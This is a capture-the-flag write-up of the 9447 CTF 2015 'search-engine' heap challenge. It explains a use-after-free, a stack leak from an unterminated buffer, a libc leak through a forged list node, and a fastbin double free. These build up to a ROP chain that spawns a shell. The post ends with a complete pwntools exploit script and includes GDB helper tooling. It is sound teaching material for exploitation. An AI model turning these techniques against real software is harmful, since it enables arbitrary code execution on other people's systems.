---
layout: post
title: "9447 CTF 2015: Search Engine Writeup"
date: 2016-09-21 21:36:36 -0700
comments: true
published: true
tags: ['ctf', 'writeup', 'binary', 'exploitation', 'heap', 'fastbin']
---

I've been going through [how2heap](https://github.com/shellphish/how2heap) problems recently, and I really enjoyed solving search-engine from 9447 CTF 2015. This was a pretty complicated problem, but it was also a lot of fun so I'll be sharing a writeup of my solution below. I'd highly recommend going over [sploitfun's glibc malloc article](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/) and the [fastbin_dup_into_stack.c](https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c) example from how2heap before going through this writeup.

<!-- more -->

I'll be using a 64-bit Ubuntu 14.04 VM, specifically the one [here](https://github.com/gsingh93/ctf-vm). You can get the binary [here](https://github.com/ctfs/write-ups-2015/blob/master/9447-ctf-2015/exploitation/search-engine/search-bf61fbb8fa7212c814b2607a81a84adf)

## Reversing the binary

We first run `file` and `checksec` before jumping into reversing the binary:
```
$ file search-bf61fbb8fa7212c814b2607a81a84adf
search-bf61fbb8fa7212c814b2607a81a84adf: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=4f5b70085d957097e91f940f98c0d4cc6fb3343f, stripped
```

```
$ checksec search-bf61fbb8fa7212c814b2607a81a84adf
[*] '/vagrant/ctf/9447-2015/search-engine/search-bf61fbb8fa7212c814b2607a81a84adf'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
    FORTIFY:  Enabled
```

So we're working with a 64-bit, dynamically linked, stripped binary, which has NX and canaries enabled.

The binary is a program for indexing sentences and then searching for words in those sentences. Here's some example output:

```
$ ./search-bf61fbb8fa7212c814b2607a81a84adf
1: Search with a word
2: Index a sentence
3: Quit
2
Enter the sentence size:
3
Enter the sentence:
a b
Added sentence
1: Search with a word
2: Index a sentence
3: Quit
1
Enter the word size:
1
Enter the word:
a
Found 3: a b
Delete this sentence (y/n)?
y
Deleted!
```

After entering a sentence, the binary takes each word and adds it to a linked list of words. A node in this linked list looks like this:

``` c
struct Word {
    char *word_ptr;
    int word_len;
    int unused_padding1;
    char *sentence;
    int sentence_size;
    int unused_padding2;
    struct Word *next;
};
```

Each word in the sentence has a `word_ptr` that points into the `sentence` pointer, which all words in a sentence share. When indexing a new sentence, the words are simply added to the front of the linked list, so it acts like a stack.

Searching for a word involves iterating over this linked list of words, ensuring the sentence string isn't empty, and comparing the word to the target word. If we have a match, the sentence is printed and you have the option of deleting the sentence:

``` c
for ( i = words; i; i = i->next )
{
  if ( *i->sentence )
  {
    if ( i->word_len == size && !memcmp(i->word_ptr, needle, size) )
    {
      __printf_chk(1LL, "Found %d: ", i->sentence_size);
      fwrite(i->sentence, 1uLL, i->sentence_size, stdout);
      putchar('\n');
      puts("Delete this sentence (y/n)?");
      read_until_newline(&choice, 2, 1);
      if ( choice == 'y' )
      {
        memset(i->sentence, 0, i->sentence_size);
        free(i->sentence);
        puts("Deleted!");
      }
    }
  }
}
```

Note how the sentence is zeroed out before freeing it. This prevents the `*i->sentence` check from passing for any of the words in that sentence. However this is a standard use after free (UAF). Once you zero out and free some data, that data doesn't go untouched. glibc keeps free chunks in a doubly linked list, and the forward and backwards pointers for this list in the same region of memory where the data for the chunk used to be stored. This means that those pointers can cause the `*i->sentence` check to pass even after the data was freed and zeroed out. This means we might be able to free the same sentence twice, causing a double free. This can lead to both memory leaks as well as allowing us to write to various locations in memory, as we'll see later.

Another function worth mention is `read_num`, which is used to supply the length of any strings we need to enter:
``` c
int read_num()
{
  int result; // eax@1
  char *endptr; // [sp+8h] [bp-50h]@1
  char nptr[48]; // [sp+10h] [bp-48h]@1
  __int64 v3; // [sp+48h] [bp-10h]@1

  v3 = *MK_FP(__FS__, 40LL);
  read_until_newline(nptr, 48, 1);
  result = strtol(nptr, &endptr, 0);
  if ( endptr == nptr )
  {
    __printf_chk(1LL, "%s is not a valid number\n", nptr);
    result = read_num();
  }
  *MK_FP(__FS__, 40LL);
  return result;
}
```

The function reads up to 48 characters into a 48 byte buffer before attempting to convert the string to a number. `read_until_newline` is backed by the libc `read` function, and will read until either the number of characters specified is read or a newline is encountered. Note that it does not NULL-terminate the buffer. Since it does not NULL-terminate the string explicitly, any attempts to print the string will also print any data following the string until a NULL byte is run into. Lucky for us, the string is printed in the next few lines when the input begins with something that can't be converted to a number by `strtol`. We will use this for a stack leak later in the exploit.

Now that we understand the binary, we can talk about how to exploit it. The general approach will be to call `system('/bin/sh')`. However, we don't know the address of `system` because of ASLR. We will thus need a libc leak to calculate this address. In order to jump to this code, we will need to control a return address of a function. Our analysis of the code shows that a double free is likely, which means we may be able to write to "arbitrary" memory by making a chunk in the free list point to the memory we want to write to (we can't exactly write anywhere, as there a few checks we need to pass. Hence the quotes around "arbitrary"). We won't be able to write a GOT address without failing these checks, but we may be able to pass these checks if we overwrite a return address on the stack instead (the details of why are explained in the corresponding section). However, in order to overwrite a return address on the stack, we need a stack leak (again because of ASLR).

Thus, our approach will 1) leak a stack address, 2) leak a libc address, 3) get a double free, and 4) use the double free to overwrite a return address to a call to `system(/bin/sh)`.

## Getting a stack leak

The stack leak is the easiest part of the exploit, so we'll start with that.

Here's a basic [pwntools](https://github.com/Gallopsled/pwntools) script to fill up the buffer and see it printed. As mentioned in the previous section, `read_until_newline` is backed by `read` which does not terminate it's input with a NULL byte, so filling up the buffer will leak any memory after it until we hit a NULL byte.

``` python
#!/usr/bin/env python2

from pwn import *

context(arch="amd64", os="linux")

p = process('./search-bf61fbb8fa7212c814b2607a81a84adf')
# gdb.attach(p, '''
# ''')

def main():
    p.sendline('A' * 48)
    p.interactive()

if __name__ == '__main__':
    main()
```

You can comment in the `gdb.attach` section when you want to attach `gdb` to the binary.

Running the script gives:

``` python
$ ./solve.py
[+] Starting local process './search-bf61fbb8fa7212c814b2607a81a84adf': Done
[*] Switching to interactive mode
1: Search with a word
2: Index a sentence
3: Quit
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA is not a valid number
```

So no leak. This isn't surprising considering the code isn't storing any data in that location in this particular function. We were hoping to get lucky and leak any previous data stored there, but we can open up GDB and confirm that memory is filled with zeros. Luckily, instead of looping whenever the input is invalid, the binary recurses instead. This means we can shift the stack lower and see if we get lucky somewhere else!

Let's try sending the same string again:

```
$ ./solve.py
[+] Starting local process './search-bf61fbb8fa7212c814b2607a81a84adf': Done
[*] Switching to interactive mode
1: Search with a word
2: Index a sentence
3: Quit
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA is not a valid number
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xfe\x7f is not a valid number
```

We have a leak! Note that we occassionally get unlucky and have a null byte in the leaked address, but this doesn't happen too often so it isn't a problem. We can now parse out this address using Python:

``` python
def leak_stack():
    # p.sendline('A'*48)
    # p.recvuntil('Quit\n')
    # p.recvline()

    # doesn't work all the time
    p.sendline('A'*48)
    leak = p.recvline().split(' ')[0][48:]
    return int(leak[::-1].encode('hex'), 16)
```

We'll use this function in our final exploit.

## Getting a libc leak

This part of the exploit took me some time to come up with. The main observation we can make is that if we can exploit the UAF to allocate a sentence on top of a Word node, we can then control the `sentence` pointer. We can then search for words in that sentence, and when we get a match, the sentence will be printed, and since we control that pointer we can read arbitrary memory.

Another important observation is that when a sentence is zeroed out, the words of that sentence are also zeroed out because words are simply pointers into the original sentence. However, if we can bypass the sentence NULL check (using the UAF), then we can still match on words by matching on the empty string!

Using that information, we come up with the following plan:

1. Allocate a sentence that has the same length as a `Word` node (40 bytes).
2. Delete the sentence.
3. Index a new sentence that is more than 16 bytes greater than the original sentence (so that it doesn't reuse the chunk we just freed). When we create this sentence, a new `Word` node is allocated where our original sentence is.
4. The `sentence` we originally freed is no longer NULL, because there's a `Word` on top of it! That means the NULL check is bypassed. We can then search for an empty string to match a word in the sentence (as long as that word is still NULL and was not overwritten).
5. We now have a 40 byte free chunk in a fastbin, but that same chunk is still being used as a `Word` node. Thus, we can allocate a new 40 byte sentence and put a fake node in this sentence, thus setting the `sentence` pointer to whatever we want (we'll leak a GOT address).
6. When we search for that `Word` node, when we get a match the `sentence` will be printed, which will leak memory.

This is implemented in the following function, which is commented with some of the details.
```
def leak_libc():
    # this sentence is the same size as a list node
    index_sentence(('a'*12 + ' b ').ljust(40, 'c'))

    # delete the sentence
    search('a' * 12)
    p.sendline('y')

    # the node for this sentence gets put in the previous sentence's spot.
    # note we made sure this doesn't reuse the chunk that was just freed by
    # making it 64 bytes
    index_sentence('d' * 64)

    # free the first sentence again so we can allocate something on top of it.
    # this will work because 1) the sentence no longer starts with a null byte
    # (in fact, it should be clear that it starts a pointer to 64 d's), and 2)
    # the location where our original string contained `b` is guaranteed to be
    # zero. this is because after the original sentence was zeroed out, nothing
    # was allocated at offset 12, which is just padding in the structure. if
    # we had made the first word in the string 16 bytes instead of 12, then that
    # would put 'b' at a location where it would not be guaranteed to be zero.
    search('\x00')
    p.sendline('y')

    # make our fake node
    node = ''
    node += p64(0x400E90) # word pointer "Enter"
    node += p64(5) # word length
    node += p64(0x602028) # sentence pointer (GOT address of free)
    node += p64(64) # length of sentence
    node += p64(0x00000000) # next pointer is null
    assert len(node) == 40

    # this sentence gets allocated on top of the previous sentence's node.
    # we can thus control the sentence pointer of that node and leak memory.
    index_sentence(node)

    # this simply receives all input from the binary and discards it, which
    # makes parsing out the leaked address easier below.
    p.clean()

    # leak the libc address
    search('Enter')
    p.recvuntil('Found 64: ')
    leak = u64(p.recvline()[:8])
    p.sendline('n') # deleting it isn't necessary
    return leak
```

One important note is that the choice of GOT address (`0x602028` in this case) is important. I originally used a different GOT address, whose corresponding function just happened to have a least significant byte of zero. This means that the corresponding `sentence` is an empty string. This is entirely dependent on your libc.

## Alternate libc leak

After I solved this problem, I was looking up other solutions, and I saw a useful technique used by [PPP's solution](https://github.com/pwning/public-writeup/blob/master/9447ctf2015/pwn230-search/pwn.py#L74).

The fastbins are different from small and large bins in that only the forward pointers are used for fastbins. For the other bins, the first index in each list is a libc address (probably pointing to the address of the index in the array, but I'm not completely sure). So if we allocate a small bin sized sentence instead (simply by allocating a chunk larger than 128 bytes), free the sentence, and then print the sentence (by matching on a word with an empty string), we'd print the small bin, including the libc address.

While I'll definitely be using this trick in the future, the rest of this post assumes my original method of leaking a libc address.

## Exploiting a double free

So we have a stack leak and a libc leak, now we just need to be able to overwrite a return address on the stack. Let's start by figuring out how to get a double free, and then we can figure out how to exploit it later.

For our first attempt, let's create two sentences: `'a'*54 + ' d'` (let's call this `sentence_a`) and `'b'*54 + ' d'` (let's call this `sentence_c`). The reason we choose sentences of size 56 is that this puts us in the fastbin of size 64, which prevents the allocations of the `Word` nodes (40 bytes puts them in the 48 byte fastbin) and search words (the words we search for are small enough to fit in the 32 byte fastbin). If we allocate and free these two sentences (by searching for the word 'd'), we have our fastbin looks like `sentence_a_addr -> sentence_b_addr -> NULL`, since the sentence with 'b's is freed first. Then let's try to get a double free by searching for '\x00', since we know that the zeroed out 'd' byte should still be zero. We first iterate over both words in the sentence with 'b's, but the sentence pointer points to an empty string (because this is the last element in the linked list), so we don't double free this sentence. However, since `sentence_a_addr` points to `sentence_b_addr` (which is not NULL), we pass the NULL check and free this sentence. Our fastbin list would now look something like `sentence_a_addr -> sentence_a_addr -> sentence_b_addr`, however glibc prevents us from doing that. glibc checks to see whether two adjacent chunks in the free list have the same address, aborting if this is the case.

We can easily fix this problem by allocating three strings of length 56 instead of two. Following the same steps as above, we would start off with a fastbin list like `sentence_a_addr -> sentence_b_addr -> sentence_c_addr -> NULL`, and then after searching for '\x00' we would match on `sentence_b`, and the free list would look like: `sentence_b_addr -> sentence_a_addr -> sentence_b_addr -> ...`. We've created our double free cycle! We will also match on `sentence_a` in this case, but we'll choose not to delete it. Here's the code:

``` c
def index_sentence(s):
    p.sendline('2')
    p.sendline(str(len(s)))
    p.sendline(s)

def search(s):
    p.sendline('1')
    p.sendline(str(len(s)))
    p.sendline(s)

def make_cycle():
    index_sentence('a'*54 + ' d')
    index_sentence('b'*54 + ' d')
    index_sentence('c'*54 + ' d')

    search('d')
    p.sendline('y')
    p.sendline('y')
    p.sendline('y')
    search('\x00')
    p.sendline('y')
    p.sendline('n')
```

Now that we have our double free, what can we do with it? We can first allocate a new sentence of size 56, and we'd get back the `sentence_b` chunk. We'd put a fake heap chunk (in particular a fake `fwd` pointer) in this sentence, and since this heap chunk is still in the free list (because we created that cycle), we can thus control the next chunk in the free list! We can make the fake chunk with the function below:

``` c
def make_fake_chunk(addr):
    # set the fwd pointer of the chunk to the address we want
    fake_chunk = p64(addr)
    index_sentence(fake_chunk.ljust(56))
```

The next question is what address we pass to it. We can't just make our fake chunk anywhere, because glibc checks to make sure the size of the chunk matches up with the fastbin it's in. In our case, our chunk is 64 bytes, which is 0x40, so our index is 2. We can thus only create a chunk in a location where this condition will be satisfied, meaning we need to allocate our chunk in a place where the size is between 0x40 and 0x4F inclusive (The index is calculated with `(size >> 4) - 2)`, which is why this works). This is why we can't overwrite a GOT address, as mentioned in the first section. My original idea was to start indexing a string, but when asked for the size of a string, put a long invalid string that ends with the qword 0x40. Then we allocate our chunk there (which is easy because we have a stack leak), and then we can overwrite the return address. This almost worked, but if you look in the `index` function you'll see there's a `puts` between `read_num` and `malloc`, which modifies the stack and removes the 0x40 we put on it.

At this point I decided to just dump the stack and see if there was already a 0x40 I could use on it. After running `telescope $rsp 20` in pwndbg, I saw a bunch of code segment addresses that started with the byte 0x40 very close to the return address of the function. We could thus use this as the size of our fake heap chunk. We use ROPGadget to find a `pop rdi; ret` gadget at 0x400e23, and we use that with the address of '/bin/sh' and `system` in the libc (calculated with the libc leak) to spawn a shell. The code for this is below, and you can find the full exploit at the bottom of this post.

``` c
pop_rdi_ret = 0x400e23

def allocate_fake_chunk(binsh_addr, system_addr):
    # allocate twice to get our fake chunk
    index_sentence('A'*56)
    index_sentence('B'*56)

    # overwrite the return address
    buf = 'A'*30
    buf += p64(pop_rdi_ret)
    buf += p64(binsh_addr)
    buf += p64(system_addr)
    buf = buf.ljust(56, 'C')

    index_sentence(buf)
```

## Tips

I added a few commands to [pwndbg](https://github.com/pwndbg/pwndbg) a while ago to display some useful heap information (as long as your libc has debugging symbols), but it seems like most people don't know about them. `bins` displays the fastbins, and `heap` displays all the chunks in the heap. `malloc_chunk <addr>` prints a nicely formatted chunk at the supplied address. I'll be improving these commands using some of the lessons learned from this problem.

One neat trick I used was based on something I saw in a [livestream](https://www.youtube.com/watch?v=AKs277vpVSY) by Gynvael, captain of Dragon Sector. Essentially instead of breaking on every `malloc` and `free` and inspecting memory/registers or using the `bins` or `heap` commands to see what's getting allocated, we can simply print out that information as it happens. Put the following code in `helper.py`:

```
import gdb

last_size = None
malloc_map = {}

def ExprAsInt(expr):
    return int(str(gdb.parse_and_eval("(void*)(%s)" % expr)).split(" ")[0], 16)

class MallocFinishBreakpoint(gdb.FinishBreakpoint):
    def __init__ (self):
        gdb.FinishBreakpoint.__init__(
            self,
            gdb.newest_frame(),
            internal=True,
        )
        self.silent = True

    def stop(self):
        where = ExprAsInt('$rax')
        print("0x%.8x <---- malloc of 0x%x bytes" % (where, last_size))

        if where in malloc_map:
            print("[!] where already in malloc map")
        malloc_map[where] = last_size

        return False

class MallocBreakpoint(gdb.Breakpoint):
    def __init__(self):
        gdb.Breakpoint.__init__(self, 'malloc', internal=True)
        self.silent = True

    def stop(self):
        global last_size
        last_size = ExprAsInt('$rdi')
        MallocFinishBreakpoint()

        return False

class FreeBreakpoint(gdb.Breakpoint):
    def __init__ (self):
        gdb.Breakpoint.__init__(self, 'free', internal=True)
        self.silent = True

    def stop(self):
        where = ExprAsInt('$rdi')
        if where in malloc_map:
            print("0x%.8x <---- free of 0x%x bytes" % (where, malloc_map[where]))
            del malloc_map[where]
        else:
            print("0x%.8x <---- free (not in malloc map?!)" % where)

MallocBreakpoint()
FreeBreakpoint()
```

You can source it with `source helper.py` in GDB, but I'd recommend putting it in a directory-local `.gdbinit`. Now as the program runs, you'll see messages like:

```
0x00603010 <---- malloc of 0xa bytes
0x00603010 <---- free of 0xa bytes
```

I'm going to be working on getting this functionality into `pwndbg`.

This last tip was also taken from Gynvael's livestream. You can put structs into a C file (like the `Word` struct file above), compile them with `gcc -gstabs -c structs.c -o structs.o`, and then load them in GDB with `add-symbol-file structs.o 0`. Then if you have a pointer to that struct at address `0xabcd`, you can easily dump that struct with `p *(struct Word*)0xabcd` and see all the fields of the struct. You can even use that struct in loops. For example, you can give the following GDB function an address to a `Word*` and it'll print out the entire `Word` list:

```
define plist
  set $iter = (struct Word*)$arg0
  while $iter
    print *$iter
    set $iter = $iter->next
  end
end
```

The output after indexing the sentence 'a b' and 'c d' looks like:
```
pwndbg> plist 0x006030e0
$1 = {
  word_ptr = 0x603092 "d",
  word_len = 1,
  field_C = 0,
  sentence = 0x603090 "c d",
  sentence_size = 3,
  field_1C = 0,
  next = 0x6030b0
}
$2 = {
  word_ptr = 0x603090 "c d",
  word_len = 1,
  field_C = 0,
  sentence = 0x603090 "c d",
  sentence_size = 3,
  field_1C = 0,
  next = 0x603060
}
$3 = {
  word_ptr = 0x603012 "b",
  word_len = 1,
  field_C = 0,
  sentence = 0x603010 "a b",
  sentence_size = 3,
  field_1C = 0,
  next = 0x603030
}
$4 = {
  word_ptr = 0x603010 "a b",
  word_len = 1,
  field_C = 0,
  sentence = 0x603010 "a b",
  sentence_size = 3,
  field_1C = 0,
  next = 0x0
}
```

Putting all this inside a `.gdbinit` in the local directory is a convenient way of loading all this automatically:

```
!gcc -gstabs -c structs.c -o structs.o
add-symbol-file structs.o 0

source helper.py

define plist
  set $iter = (struct Word*)$arg0
  while $iter
    print *$iter
    set $iter = $iter->next
  end
end
```

## Full exploit

The full exploit is provided below. Remember that you'll need to change the offsets for a different libc. You also may need to run it a few times because the stack leak occassionally fails, as mentioned above.

``` c
#!/usr/bin/env python2

from pwn import *

context(arch="amd64", os="linux")

p = process('./search-bf61fbb8fa7212c814b2607a81a84adf')

pop_rdi_ret = 0x400e23
system_offset = 0x46590
puts_offset = 0x6fd60
binsh_offset = 1558723

def leak_stack():
    p.sendline('A'*48)
    p.recvuntil('Quit\n')
    p.recvline()

    # doesn't work all the time
    p.sendline('A'*48)
    leak = p.recvline().split(' ')[0][48:]
    return int(leak[::-1].encode('hex'), 16)

def leak_libc():
    # this sentence is the same size as a list node
    index_sentence(('a'*12 + ' b ').ljust(40, 'c'))

    # delete the sentence
    search('a' * 12)
    p.sendline('y')

    # the node for this sentence gets put in the previous sentence's spot.
    # note we made sure this doesn't reuse the chunk that was just freed by
    # making it 64 bytes
    index_sentence('d' * 64)

    # free the first sentence again so we can allocate something on top of it.
    # this will work because 1) the sentence no longer starts with a null byte
    # (in fact, it should be clear that it starts a pointer to 64 d's), and 2)
    # the location where our original string contained `b` is guaranteed to be
    # zero. this is because after the original sentence was zeroed out, nothing
    # was allocated at offset 12, which is just padding in the structure. if
    # we had made the first word in the string 16 bytes instead of 12, then that
    # would put 'b' at a location where it would not be guaranteed to be zero.
    search('\x00')
    p.sendline('y')

    # make our fake node
    node = ''
    node += p64(0x400E90) # word pointer "Enter"
    node += p64(5) # word length
    node += p64(0x602028) # sentence pointer (GOT address of free)
    node += p64(64) # length of sentence
    node += p64(0x00000000) # next pointer is null
    assert len(node) == 40

    # this sentence gets allocated on top of the previous sentence's node.
    # we can thus control the sentence pointer of that node and leak memory.
    index_sentence(node)

    # this simply receives all input from the binary and discards it, which
    # makes parsing out the leaked address easier below.
    p.clean()

    # leak the libc address
    search('Enter')
    p.recvuntil('Found 64: ')
    leak = u64(p.recvline()[:8])
    p.sendline('n') # deleting it isn't necessary
    return leak

def index_sentence(s):
    p.sendline('2')
    p.sendline(str(len(s)))
    p.sendline(s)

def search(s):
    p.sendline('1')
    p.sendline(str(len(s)))
    p.sendline(s)

def make_cycle():
    index_sentence('a'*54 + ' d')
    index_sentence('b'*54 + ' d')
    index_sentence('c'*54 + ' d')

    search('d')
    p.sendline('y')
    p.sendline('y')
    p.sendline('y')
    search('\x00')
    p.sendline('y')
    p.sendline('n')

def make_fake_chunk(addr):
    # set the fwd pointer of the chunk to the address we want
    fake_chunk = p64(addr)
    index_sentence(fake_chunk.ljust(56))

def allocate_fake_chunk(binsh_addr, system_addr):
    # allocate twice to get our fake chunk
    index_sentence('A'*56)
    index_sentence('B'*56)

    # overwrite the return address
    buf = 'A'*30
    buf += p64(pop_rdi_ret)
    buf += p64(binsh_addr)
    buf += p64(system_addr)
    buf = buf.ljust(56, 'C')

    index_sentence(buf)

def main():
    stack_leak = leak_stack()

    # This makes stack_addr + 0x8 be 0x40
    stack_addr = stack_leak + 0x22 - 8

    log.info('stack leak: %s' % hex(stack_leak))
    log.info('stack addr: %s' % hex(stack_addr))

    libc_leak = leak_libc()
    libc_base = libc_leak - puts_offset
    system_addr = libc_base + system_offset
    binsh_addr = libc_base + binsh_offset

    log.info('libc leak: %s' % hex(libc_leak))
    log.info('libc_base: %s' % hex(libc_base))
    log.info('system addr: %s' % hex(system_addr))
    log.info('binsh addr: %s' % hex(binsh_addr))

    make_cycle()
    make_fake_chunk(stack_addr)
    allocate_fake_chunk(binsh_addr, system_addr)

    p.interactive()

if __name__ == '__main__':
    main()
```
